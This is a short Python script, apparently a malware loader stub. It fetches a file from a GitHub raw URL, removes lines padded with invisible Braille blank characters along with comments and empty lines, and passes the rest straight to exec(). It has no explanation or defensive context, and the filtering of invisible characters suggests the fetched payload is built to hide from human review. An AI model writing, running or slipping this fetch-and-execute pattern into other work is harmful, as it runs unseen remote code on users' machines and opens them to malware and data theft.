import urllib.request
import subprocess
import sys
import os
import tempfile

url = 'https://raw.githubusercontent.com/fevberr/fevberr/refs/heads/main/junk/ramies.py'
req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
raw = urllib.request.urlopen(req).read().decode()

lines = raw.splitlines()
clean_lines = [line for line in lines if not line.startswith('\u2800') and line.strip() and not line.strip().startswith('#')]

cleaned = '\n'.join(clean_lines)

exec(cleaned)
